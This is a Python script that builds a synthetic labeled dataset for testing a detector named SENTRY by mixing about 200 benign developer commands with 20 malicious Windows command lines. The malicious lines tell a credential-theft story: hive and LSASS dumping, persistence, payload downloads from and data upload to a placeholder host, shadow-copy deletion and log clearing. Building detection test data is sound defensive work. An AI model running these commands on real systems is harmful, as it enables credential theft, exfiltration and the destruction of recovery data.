"""Generate a synthetic labeled process-command dataset for testing SENTRY.

Produces ~220 rows: 20 malicious commands forming a coherent credential-theft ->
exfiltration attack story, hidden in ~200 realistic benign commands that are
crafted NOT to trip the detector's signatures (so false positives are a real test
of precision, not an artifact of sloppy noise).

Usage:
    python3 tools/make_synthetic.py [output.csv] [--seed N]

Writes a CSV with columns: process_name, command_line, label
"""
import csv
import random
import sys

# --- The 20-command attack: credential theft -> staging -> exfiltration -----
# Ordered as a story; shuffled into the noise on output. Each is (process, cmd).
ATTACK = [
    ("powershell.exe", "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA="),
    ("cmd.exe", "schtasks /create /tn \"WindowsUpdater\" /tr C:\\Windows\\Temp\\u.ps1 /sc onlogon /ru system"),
    ("reg.exe", "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d C:\\Windows\\Temp\\u.ps1 /f"),
    ("cmd.exe", "net user svc_backup P@ssw0rd123 /add"),
    ("reg.exe", "reg save HKLM\\SAM C:\\Windows\\Temp\\sam.save"),
    ("reg.exe", "reg save HKLM\\SYSTEM C:\\Windows\\Temp\\sys.save"),
    ("procdump.exe", "procdump -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp"),
    ("cmd.exe", "C:\\Windows\\Temp\\m.exe sekurlsa::logonpasswords"),
    ("certutil.exe", "certutil -urlcache -f http://203.0.113.7/tool.exe C:\\Windows\\Temp\\tool.exe"),
    ("bitsadmin.exe", "bitsadmin /transfer job http://203.0.113.7/p.exe C:\\Windows\\Temp\\p.exe"),
    ("powershell.exe", "powershell iex (new-object net.webclient).downloadstring('http://203.0.113.7/s.ps1')"),
    ("wmic.exe", "wmic process call create \"cmd /c C:\\Windows\\Temp\\p.exe\""),
    ("rundll32.exe", "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write()"),
    ("makecab.exe", "makecab C:\\Windows\\Temp\\sam.save C:\\Windows\\Temp\\loot.zip"),
    ("cmd.exe", "copy C:\\Windows\\Temp\\sam.save \\\\fileserver\\exfil\\sam.save"),
    ("cmd.exe", "copy C:\\Windows\\Temp\\loot.zip \\\\fileserver\\exfil\\loot.zip"),
    ("curl.exe", "curl -T C:\\Windows\\Temp\\loot.zip http://203.0.113.7/upload"),
    ("vssadmin.exe", "vssadmin delete shadows /all /quiet"),
    ("bcdedit.exe", "bcdedit /set {default} recoveryenabled no"),
    ("wevtutil.exe", "wevtutil cl Security"),
]

# --- Benign noise building blocks (crafted to avoid detector signatures) -----
BENIGN_TEMPLATES = [
    ("git", "git {gitcmd}"),
    ("npm", "npm {npmcmd}"),
    ("python3", "python3 {pyfile}"),
    ("pip3", "pip3 install {pkg}"),
    ("docker", "docker {dockercmd}"),
    ("kubectl", "kubectl {kubecmd}"),
    ("node", "node {jsfile}"),
    ("bash", "ls -la /home/{user}/{dir}"),
    ("bash", "cd /var/www/{dir}"),
    ("bash", "cat /etc/hosts"),
    ("bash", "grep -r TODO /home/{user}/{dir}"),
    ("bash", "mkdir -p /home/{user}/{dir}/build"),
    ("cmd.exe", "dir C:\\Projects\\{dir}"),
    ("cmd.exe", "type C:\\Projects\\{dir}\\README.md"),
    ("powershell.exe", "Get-ChildItem C:\\Users\\{user}\\Documents"),
    ("powershell.exe", "Get-Process | Sort-Object CPU"),
    ("make", "make {makecmd}"),
    ("go", "go {gocmd}"),
    ("java", "java -jar {dir}/app.jar"),
    ("psql", "psql -d {dir}_db -c \"SELECT count(*) FROM users\""),
]
GIT = ["status", "pull", "push origin main", "commit -m 'wip'", "log --oneline", "diff", "fetch", "checkout -b feature"]
NPM = ["install", "run build", "test", "run lint", "ci", "run dev"]
PYF = ["app.py", "manage.py migrate", "train.py --epochs 10", "server.py", "etl/load.py", "-m pytest"]
PKG = ["requests", "numpy", "pandas", "flask", "pytest", "boto3"]
DOCKER = ["ps", "build -t app .", "compose up -d", "logs web", "images", "pull node:20"]
KUBE = ["get pods", "apply -f deploy.yaml", "logs web-0", "get svc", "describe pod api-1"]
JS = ["index.js", "build.js", "server.js", "scripts/seed.js"]
USERS = ["alice", "bob", "carol", "dave", "erin"]
DIRS = ["api", "web", "core", "data", "infra", "auth", "billing"]
MAKEC = ["build", "test", "clean", "install", "lint"]
GOC = ["build ./...", "test ./...", "run main.go", "mod tidy"]


def benign_command(rng):
    proc, tmpl = rng.choice(BENIGN_TEMPLATES)
    cmd = tmpl.format(
        gitcmd=rng.choice(GIT), npmcmd=rng.choice(NPM), pyfile=rng.choice(PYF),
        pkg=rng.choice(PKG), dockercmd=rng.choice(DOCKER), kubecmd=rng.choice(KUBE),
        jsfile=rng.choice(JS), user=rng.choice(USERS), dir=rng.choice(DIRS),
        makecmd=rng.choice(MAKEC), gocmd=rng.choice(GOC),
    )
    return proc, cmd


def generate(n_benign=200, seed=1337):
    rng = random.Random(seed)
    rows = [(p, c, "malicious") for p, c in ATTACK]
    for _ in range(n_benign):
        p, c = benign_command(rng)
        rows.append((p, c, "benign"))
    rng.shuffle(rows)
    return rows


def main():
    args = [a for a in sys.argv[1:] if not a.startswith("--")]
    seed = 1337
    for a in sys.argv[1:]:
        if a.startswith("--seed"):
            seed = int(a.split("=")[-1]) if "=" in a else 1337
    out = args[0] if args else "data/training/synthetic_credential_theft.csv"
    rows = generate(seed=seed)
    with open(out, "w", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        w.writerow(["process_name", "command_line", "label"])
        w.writerows(rows)
    mal = sum(1 for r in rows if r[2] == "malicious")
    print(f"Wrote {len(rows)} rows ({mal} malicious, {len(rows) - mal} benign) -> {out}")


if __name__ == "__main__":
    main()
